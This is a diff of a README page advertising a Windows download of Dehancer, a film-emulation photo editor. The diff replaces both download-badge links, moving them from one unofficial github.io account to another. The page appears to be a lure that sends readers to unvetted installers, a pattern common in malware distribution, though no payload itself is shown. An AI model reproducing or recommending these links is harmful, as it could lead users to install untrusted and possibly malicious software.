@@ -4,7 +4,7 @@
 
 ## 📥 Download Dehancer for Windows
 
-[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/43)
+[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://dehancerload.github.io/.github/)
 
 ---
 
@@ -28,7 +28,7 @@ Dehancer is a photo editing software that specializes in film emulation and colo
 
 The software offers a range of features, including a vast library of film stock presets, grain simulation, and advanced color grading tools. Dehancer is perfect for photographers, filmmakers, and creatives who want to achieve a vintage or cinematic look for their images and videos.
 
-[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/43)
+[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://dehancerload.github.io/.github/)
 
 ---
 
